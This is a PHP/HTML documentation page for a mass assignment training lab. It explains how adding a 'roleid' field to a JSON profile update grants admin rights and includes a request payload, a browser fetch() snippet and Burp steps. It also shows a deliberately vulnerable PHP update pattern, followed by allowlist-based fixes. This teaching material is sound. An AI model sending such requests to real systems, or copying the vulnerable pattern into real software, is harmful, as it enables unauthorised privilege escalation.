<?php
session_start();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Documentation - Mass Assignment Vulnerability</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a0a0a 100%);
            min-height: 100vh;
            color: #e0e0e0;
        }
        .header {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border-bottom: 1px solid rgba(255, 68, 68, 0.3);
            padding: 1rem 2rem;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            z-index: 100;
        }
        .header-content {
            max-width: 1400px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .logo {
            font-size: 1.5rem;
            font-weight: bold;
            color: #ff4444;
            text-decoration: none;
        }
        .nav-links {
            display: flex;
            gap: 1.5rem;
            align-items: center;
        }
        .nav-links a {
            color: #e0e0e0;
            text-decoration: none;
            font-weight: 500;
            transition: color 0.3s;
        }
        .nav-links a:hover { color: #ff4444; }
        .btn-nav {
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            padding: 0.5rem 1rem;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 68, 68, 0.3);
            color: #e0e0e0;
            text-decoration: none;
            border-radius: 6px;
            transition: all 0.3s;
        }
        .btn-nav:hover {
            background: rgba(255, 68, 68, 0.2);
            border-color: #ff4444;
            color: #ff4444;
        }
        .layout {
            display: flex;
            margin-top: 60px;
        }
        .sidebar {
            width: 280px;
            background: rgba(255, 255, 255, 0.02);
            border-right: 1px solid rgba(255, 68, 68, 0.1);
            padding: 2rem 1rem;
            position: fixed;
            top: 60px;
            bottom: 0;
            overflow-y: auto;
        }
        .sidebar h3 {
            color: #ff4444;
            font-size: 0.9rem;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 1rem;
            padding-left: 1rem;
        }
        .sidebar-nav {
            list-style: none;
        }
        .sidebar-nav li a {
            display: block;
            padding: 0.7rem 1rem;
            color: #888;
            text-decoration: none;
            border-radius: 6px;
            transition: all 0.3s;
            font-size: 0.95rem;
        }
        .sidebar-nav li a:hover,
        .sidebar-nav li a.active {
            background: rgba(255, 68, 68, 0.1);
            color: #ff4444;
        }
        .main-content {
            flex: 1;
            margin-left: 280px;
            padding: 3rem;
            max-width: calc(100% - 280px);
        }
        .doc-section {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 68, 68, 0.1);
            border-radius: 15px;
            padding: 2.5rem;
            margin-bottom: 2rem;
        }
        .doc-section h1 {
            color: #ff4444;
            font-size: 2rem;
            margin-bottom: 1.5rem;
            padding-bottom: 1rem;
            border-bottom: 1px solid rgba(255, 68, 68, 0.2);
        }
        .doc-section h2 {
            color: #ff6666;
            font-size: 1.5rem;
            margin: 2rem 0 1rem 0;
        }
        .doc-section h3 {
            color: #ff8888;
            font-size: 1.2rem;
            margin: 1.5rem 0 1rem 0;
        }
        .doc-section p {
            color: #b0b0b0;
            line-height: 1.8;
            margin-bottom: 1rem;
        }
        .doc-section ul, .doc-section ol {
            color: #b0b0b0;
            line-height: 1.8;
            margin-left: 1.5rem;
            margin-bottom: 1rem;
        }
        .doc-section li {
            margin-bottom: 0.5rem;
        }
        .code-block {
            background: rgba(0, 0, 0, 0.4);
            border: 1px solid rgba(255, 68, 68, 0.2);
            border-radius: 8px;
            padding: 1.2rem;
            margin: 1rem 0;
            overflow-x: auto;
        }
        .code-block pre {
            color: #ff6666;
            font-family: 'Consolas', 'Monaco', monospace;
            font-size: 0.9rem;
            line-height: 1.6;
            margin: 0;
        }
        .code-inline {
            background: rgba(255, 68, 68, 0.1);
            color: #ff6666;
            padding: 0.2rem 0.5rem;
            border-radius: 4px;
            font-family: 'Consolas', monospace;
            font-size: 0.9em;
        }
        .alert {
            padding: 1.2rem;
            border-radius: 10px;
            margin: 1.5rem 0;
        }
        .alert-info {
            background: rgba(68, 68, 255, 0.1);
            border: 1px solid rgba(68, 68, 255, 0.3);
        }
        .alert-info h4 { color: #6666ff; margin-bottom: 0.5rem; }
        .alert-info p { color: #a0a0ff; margin: 0; }
        .alert-warning {
            background: rgba(255, 200, 68, 0.1);
            border: 1px solid rgba(255, 200, 68, 0.3);
        }
        .alert-warning h4 { color: #ffcc44; margin-bottom: 0.5rem; }
        .alert-warning p { color: #ffdd88; margin: 0; }
        .alert-danger {
            background: rgba(255, 68, 68, 0.1);
            border: 1px solid rgba(255, 68, 68, 0.3);
        }
        .alert-danger h4 { color: #ff4444; margin-bottom: 0.5rem; }
        .alert-danger p { color: #ff8888; margin: 0; }
        .alert-success {
            background: rgba(68, 255, 68, 0.1);
            border: 1px solid rgba(68, 255, 68, 0.3);
        }
        .alert-success h4 { color: #44ff44; margin-bottom: 0.5rem; }
        .alert-success p { color: #88ff88; margin: 0; }
        .table-container {
            overflow-x: auto;
            margin: 1rem 0;
        }
        .doc-table {
            width: 100%;
            border-collapse: collapse;
        }
        .doc-table th, .doc-table td {
            padding: 1rem;
            text-align: left;
            border-bottom: 1px solid rgba(255, 68, 68, 0.1);
        }
        .doc-table th {
            background: rgba(255, 68, 68, 0.1);
            color: #ff6666;
            font-weight: 600;
        }
        .doc-table td {
            color: #b0b0b0;
        }
        .step-number {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 1.8rem;
            height: 1.8rem;
            background: linear-gradient(135deg, #ff4444, #cc0000);
            border-radius: 50%;
            color: white;
            font-weight: bold;
            font-size: 0.85rem;
            margin-right: 0.5rem;
        }
    </style>
</head>
<body>
    <header class="header">
        <div class="header-content">
            <a href="index.php" class="logo">📝 Lab 4</a>
            <nav class="nav-links">
                <a href="../index.php" class="btn-nav">← All Labs</a>
                <a href="index.php">Home</a>
                <a href="lab-description.php">Lab Info</a>
                <?php if (isset($_SESSION['user_id'])): ?>
                    <a href="profile.php">Profile</a>
                    <a href="logout.php">Logout</a>
                <?php else: ?>
                    <a href="login.php">Login</a>
                <?php endif; ?>
            </nav>
        </div>
    </header>

    <div class="layout">
        <aside class="sidebar">
            <h3>Documentation</h3>
            <ul class="sidebar-nav">
                <li><a href="#overview" class="active">Overview</a></li>
                <li><a href="#vulnerability">Vulnerability</a></li>
                <li><a href="#exploitation">Exploitation</a></li>
                <li><a href="#step-by-step">Step-by-Step Guide</a></li>
                <li><a href="#code-analysis">Code Analysis</a></li>
                <li><a href="#prevention">Prevention</a></li>
                <li><a href="#references">References</a></li>
            </ul>
            <h3 style="margin-top: 2rem;">Quick Links</h3>
            <ul class="sidebar-nav">
                <li><a href="index.php">🏠 Lab Home</a></li>
                <li><a href="login.php">🔐 Login Page</a></li>
                <li><a href="lab-description.php">📋 Lab Description</a></li>
            </ul>
        </aside>

        <main class="main-content">
            <section id="overview" class="doc-section">
                <h1>📝 User Role Modified via Profile Update</h1>
                <p>
                    This lab demonstrates a mass assignment vulnerability where the application 
                    blindly accepts and processes all JSON parameters in a profile update request, 
                    including the <span class="code-inline">roleid</span> field that determines admin status.
                </p>

                <div class="alert alert-info">
                    <h4>💡 Lab Objective</h4>
                    <p>Exploit mass assignment to change your roleid to 2 (admin) and delete user "carlos".</p>
                </div>

                <h2>What is Mass Assignment?</h2>
                <p>
                    Mass assignment occurs when an application automatically binds user input to object 
                    properties without proper filtering. If the application accepts all JSON fields and 
                    updates them in the database, attackers can modify fields they shouldn't have access to.
                </p>

                <h2>Lab Credentials</h2>
                <div class="table-container">
                    <table class="doc-table">
                        <thead>
                            <tr>
                                <th>Username</th>
                                <th>Password</th>
                                <th>Role ID</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td><span class="code-inline">wiener</span></td>
                                <td><span class="code-inline">peter</span></td>
                                <td>1 (User)</td>
                            </tr>
                        </tbody>
                    </table>
                </div>

                <h2>Role IDs</h2>
                <div class="table-container">
                    <table class="doc-table">
                        <thead>
                            <tr>
                                <th>Role ID</th>
                                <th>Role Name</th>
                                <th>Permissions</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td><span class="code-inline">1</span></td>
                                <td>User</td>
                                <td>Basic access</td>
                            </tr>
                            <tr>
                                <td><span class="code-inline">2</span></td>
                                <td>Admin</td>
                                <td>Full access + user management</td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </section>

            <section id="vulnerability" class="doc-section">
                <h1>🔍 Vulnerability Details</h1>
                
                <h2>How Mass Assignment Works</h2>
                <p>
                    The profile update endpoint accepts JSON data and updates all provided fields 
                    without validating which fields the user should be allowed to modify.
                </p>

                <h2>Normal Profile Update</h2>
                <div class="code-block">
                    <pre>POST /profile.php
Content-Type: application/json

{
    "email": "wiener@example.com",
    "name": "Peter Wiener"
}</pre>
                </div>

                <h2>Malicious Profile Update</h2>
                <div class="code-block">
                    <pre>POST /profile.php
Content-Type: application/json

{
    "email": "wiener@example.com",
    "name": "Peter Wiener",
    "roleid": 2    // ADDED: Escalate to admin!
}</pre>
                </div>

                <div class="alert alert-warning">
                    <h4>⚠️ Hidden Field Injection</h4>
                    <p>The server response often reveals additional fields that can be exploited in requests.</p>
                </div>
            </section>

            <section id="exploitation" class="doc-section">
                <h1>⚡ Exploitation</h1>

                <h2>Attack Flow</h2>
                <div class="code-block">
                    <pre>1. Login as wiener:peter
2. Go to Profile page
3. Submit normal profile update
4. Observe response contains "roleid": 1
5. Intercept next request with Burp
6. Add "roleid": 2 to JSON body
7. Submit modified request
8. Refresh - now you're admin!
9. Delete carlos</pre>
                </div>

                <h2>Using Browser DevTools</h2>
                <div class="code-block">
                    <pre>// In browser console
fetch('/profile.php', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
        email: 'wiener@example.com',
        roleid: 2  // Escalate privileges
    })
});</pre>
                </div>

                <h2>Using Burp Suite</h2>
                <div class="code-block">
                    <pre>1. Intercept profile update request
2. Original body:
   {"email":"test@test.com"}
   
3. Modified body:
   {"email":"test@test.com","roleid":2}
   
4. Forward request</pre>
                </div>

                <div class="alert alert-danger">
                    <h4>🚫 Privilege Escalation</h4>
                    <p>By adding a single field to the JSON, any user can become an administrator.</p>
                </div>
            </section>

            <section id="step-by-step" class="doc-section">
                <h1>📖 Step-by-Step Guide</h1>

                <p><span class="step-number">1</span><strong>Login to the application</strong></p>
                <p>Use credentials <span class="code-inline">wiener:peter</span></p>

                <p><span class="step-number">2</span><strong>Navigate to your profile</strong></p>
                <p>Click on "Profile" or "My Account" in the navigation</p>

                <p><span class="step-number">3</span><strong>Update your email</strong></p>
                <p>Change your email and submit the form to observe normal behavior</p>

                <p><span class="step-number">4</span><strong>Check the response</strong></p>
                <p>In DevTools (F12) → Network tab, look at the response JSON. Notice it includes <span class="code-inline">roleid</span></p>

                <p><span class="step-number">5</span><strong>Prepare the exploit</strong></p>
                <p>Open Burp Suite or use browser DevTools to intercept the next request</p>

                <p><span class="step-number">6</span><strong>Add roleid to request</strong></p>
                <p>Add <span class="code-inline">"roleid": 2</span> to the JSON body of the profile update request</p>

                <p><span class="step-number">7</span><strong>Submit and verify</strong></p>
                <p>Submit the request and refresh the page. You should now have admin access.</p>

                <p><span class="step-number">8</span><strong>Delete carlos</strong></p>
                <p>Access the admin panel and delete user "carlos"</p>

                <div class="alert alert-success">
                    <h4>✅ Success Criteria</h4>
                    <p>The lab is completed when you escalate to admin via mass assignment and delete "carlos".</p>
                </div>
            </section>

            <section id="code-analysis" class="doc-section">
                <h1>🔬 Code Analysis</h1>

                <h2>Vulnerable Code Pattern</h2>
                <div class="code-block">
                    <pre>&lt;?php
// VULNERABLE: Accepting all JSON fields
$data = json_decode(file_get_contents('php://input'), true);

// Directly updating all provided fields
$sql = "UPDATE users SET ";
$updates = [];
foreach ($data as $key => $value) {
    $updates[] = "$key = ?";  // BAD: No field validation!
}
$sql .= implode(', ', $updates);
$sql .= " WHERE id = ?";
?&gt;</pre>
                </div>

                <h2>Why This Is Dangerous</h2>
                <ul>
                    <li><strong>No allowlist</strong> - All fields accepted without filtering</li>
                    <li><strong>Direct binding</strong> - User input directly updates database</li>
                    <li><strong>Information disclosure</strong> - Response reveals internal field names</li>
                    <li><strong>No authorization check</strong> - Doesn't verify if user can modify field</li>
                </ul>
            </section>

            <section id="prevention" class="doc-section">
                <h1>🛡️ Prevention</h1>

                <h2>Secure Code Pattern</h2>
                <div class="code-block">
                    <pre>&lt;?php
// SECURE: Whitelist allowed fields
$allowedFields = ['email', 'name', 'phone'];

$data = json_decode(file_get_contents('php://input'), true);

// Only process allowed fields
$safeData = array_intersect_key($data, array_flip($allowedFields));

// Now update only safe fields
foreach ($safeData as $field => $value) {
    // Process update...
}

// Never allow roleid, is_admin, etc. from user input
?&gt;</pre>
                </div>

                <h2>Best Practices</h2>
                <ul>
                    <li><strong>Whitelist fields</strong> - Only accept explicitly allowed parameters</li>
                    <li><strong>Use DTOs</strong> - Data Transfer Objects that define allowed fields</li>
                    <li><strong>Separate endpoints</strong> - Different endpoints for user vs admin actions</li>
                    <li><strong>Server-side validation</strong> - Always validate on the server</li>
                    <li><strong>Audit logging</strong> - Log all field modification attempts</li>
                </ul>

                <h2>Framework-Specific Solutions</h2>
                <div class="code-block">
                    <pre># Laravel - Use $fillable property
class User extends Model {
    protected $fillable = ['email', 'name'];
    protected $guarded = ['roleid', 'is_admin'];
}

# Django - Use serializer fields
class UserSerializer(serializers.Serializer):
    email = serializers.EmailField()
    name = serializers.CharField()
    # roleid intentionally NOT included</pre>
                </div>

                <div class="alert alert-info">
                    <h4>💡 Defense in Depth</h4>
                    <p>Even with whitelisting, verify the user has permission to modify each specific field.</p>
                </div>
            </section>

            <section id="references" class="doc-section">
                <h1>📚 References</h1>

                <h2>Related Resources</h2>
                <ul>
                    <li><a href="https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/" style="color: #ff4444;">OWASP API3 - Broken Object Property Level Authorization</a></li>
                    <li><a href="https://cwe.mitre.org/data/definitions/915.html" style="color: #ff4444;">CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes</a></li>
                    <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html" style="color: #ff4444;">OWASP Mass Assignment Cheat Sheet</a></li>
                </ul>

                <h2>Further Reading</h2>
                <ul>
                    <li><a href="https://portswigger.net/web-security/access-control" style="color: #ff4444;">PortSwigger - Access Control</a></li>
                    <li><a href="https://github.com/OWASP/API-Security" style="color: #ff4444;">OWASP API Security Project</a></li>
                </ul>
            </section>
        </main>
    </div>

    <script>
        document.querySelectorAll('.sidebar-nav a').forEach(link => {
            link.addEventListener('click', function(e) {
                if (this.getAttribute('href').startsWith('#')) {
                    e.preventDefault();
                    const target = document.querySelector(this.getAttribute('href'));
                    if (target) {
                        target.scrollIntoView({ behavior: 'smooth' });
                    }
                    document.querySelectorAll('.sidebar-nav a').forEach(l => l.classList.remove('active'));
                    this.classList.add('active');
                }
            });
        });

        window.addEventListener('scroll', () => {
            const sections = document.querySelectorAll('.doc-section');
            let current = '';
            sections.forEach(section => {
                const sectionTop = section.offsetTop;
                if (scrollY >= sectionTop - 100) {
                    current = section.getAttribute('id');
                }
            });
            document.querySelectorAll('.sidebar-nav a').forEach(link => {
                link.classList.remove('active');
                if (link.getAttribute('href') === '#' + current) {
                    link.classList.add('active');
                }
            });
        });
    </script>
</body>
</html>